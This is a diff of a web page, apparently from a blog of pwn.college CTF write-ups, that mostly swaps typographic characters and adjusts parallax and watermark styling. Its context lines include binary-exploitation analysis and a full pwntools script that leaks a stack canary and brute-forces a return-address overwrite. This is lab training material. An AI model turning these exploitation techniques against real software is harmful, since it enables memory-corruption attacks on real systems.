@@ -586,7 +586,7 @@ world</strong>。一旦这两个世界之间发生类型转换，检查就失效
 <p>当你输入 <code>-1</code> 时，有符号的安全检查会认为
 <code>-1 &lt; 63</code>，合法直接放行。但当 <code>-1</code> 被传递给
 <code>read()</code> 并被强制类型转换为无符号的 <code>size_t</code>
-时，在 Two’s Complement (二进制补码) 的规则下，<code>-1</code>
+时，在 Two's Complement (二进制补码) 的规则下，<code>-1</code>
 的内存表示 <code>0xffffffffffffffff</code>
 会变成一个极其巨大的正数。</p>
 <h2 id="exploit-2">Exploit</h2>
@@ -662,7 +662,7 @@ partial overwrite still works.</p>
 <h1 id="pointer-problems-hard">Pointer Problems (Hard)</h1>
 <h2 id="analysis-7">Analysis</h2>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hacker@program-security~pointer-problems-hard:~$ r2 -A -q -c <span class="string">&quot;pdf @ sym.challenge&quot;</span> /challenge/pointer-problems-hard</span><br><span class="line">; BSS data address -&gt; 0x4040</span><br><span class="line">│           0x00001899      488d05a027..   lea RAX, obj.bssdata        ; 0x4040</span><br><span class="line">; buf -&gt; RBP - 0x60, string pointer at RBP - 0x10</span><br><span class="line">; padding = 0x60 - 0x10 = 0x50 = 80 bytes</span><br></pre></td></tr></table></figure>
-<p>Same trick as easy. We don’t need the full pointer, only the low
+<p>Same trick as easy. We don't need the full pointer, only the low
 bytes that redirect the stack string pointer into the flag buffer in
 <code>.BSS</code>.</p>
 <h2 id="exploit-7">Exploit</h2>
@@ -694,7 +694,7 @@ bytes</li>
 <h2 id="analysis-9">Analysis</h2>
 <p>Same approach as easy version, using a negative array index to read
 the flag from memory.</p>
-<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">pwn.college{…}</span></span>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">pwn.college{...}</span></span>
 <h1 id="now-you-got-it-easy">Now You GOT It (Easy)</h1>
 <blockquote>
 <p>Leverage an Array to obtain the flag.</p>
@@ -814,7 +814,7 @@ binary.</p>
 </ul>
 <h2 id="exploit-16">Exploit</h2>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;error&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>():</span><br><span class="line">    p = process(<span class="string">&quot;/challenge/recursive-ruin-hard&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p.sendlineafter(<span class="string">b&quot;Payload size:&quot;</span>, <span class="string">b&quot;25&quot;</span>)</span><br><span class="line">        payload1 = <span class="string">b&quot;REPEAT&quot;</span>.ljust(<span class="number">24</span>, <span class="string">b&quot;A&quot;</span>) + <span class="string">b&quot;X&quot;</span></span><br><span class="line">        p.sendafter(<span class="string">b&quot;bytes)!\n&quot;</span>, payload1)</span><br><span class="line"></span><br><span class="line">        p.recvuntil(<span class="string">b&quot;You said: &quot;</span>)</span><br><span class="line">        p.recv(<span class="number">25</span>)</span><br><span class="line">        canary = <span class="string">b&quot;\x00&quot;</span> + p.recv(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">        p.sendlineafter(<span class="string">b&quot;Payload size:&quot;</span>, <span class="string">b&quot;42&quot;</span>)</span><br><span class="line">        payload2 = <span class="string">b&quot;A&quot;</span> * <span class="number">24</span> + canary + <span class="string">b&quot;B&quot;</span> * <span class="number">8</span> + <span class="string">b&quot;\x6b\x1c&quot;</span></span><br><span class="line">        p.sendafter(<span class="string">b&quot;bytes)!\n&quot;</span>, payload2)</span><br><span class="line"></span><br><span class="line">        result = p.recvall(timeout=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&quot;pwn.college&#123;&quot;</span> <span class="keyword">in</span> result:</span><br><span class="line">            <span class="built_in">print</span>(result.decode())</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span>: <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">finally</span>: p.close()</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> itertools.count():</span><br><span class="line">    <span class="keyword">if</span> exploit(): <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
-<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">pwn.college{…}</span></span>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">pwn.college{...}</span></span>
 <h1 id="lingering-leftover-easy">Lingering Leftover (Easy)</h1>
 <blockquote>
 <p>Leak data left behind unintentionally by utilizing clever payload
@@ -1047,8 +1047,8 @@ brute-force)</strong> 来获取 canary。</p>
     let observer = null;
     let rafId = null;
 
-    const parallaxFactor = 0.1; // 提升移动幅度
-    const lerpFactor = 0.3; // 提升响应灵敏度
+    const parallaxFactor = 0.05; // 提升移动幅度
+    const lerpFactor = 0.05; // 提升响应灵敏度
     let currentY = 0; // 渲染位置
     let targetY = 0; // 目标位置
     let isUpdating = false; // 正在执行内容更新锁
@@ -1163,7 +1163,7 @@ brute-force)</strong> 来获取 canary。</p>
     transform: translateX(-50%);
     font-size: 10vw;
     font-weight: 900;
-    color: rgba(255, 255, 255, 0.035);
+    color: rgba(255, 255, 255, 0.05);
     text-transform: uppercase;
     white-space: nowrap;
     pointer-events: none;
@@ -1171,7 +1171,7 @@ brute-force)</strong> 来获取 canary。</p>
     user-select: none;
     font-family: "Roboto Mono", monospace;
     letter-spacing: -2px;
-    filter: blur(5px);
+    filter: blur(1.2px);
     opacity: 0; /* 初始隐藏，由 JS 控制淡入 */
     transition: opacity 1.2s cubic-bezier(0.4, 0, 0.2, 1);
     will-change: transform, opacity;
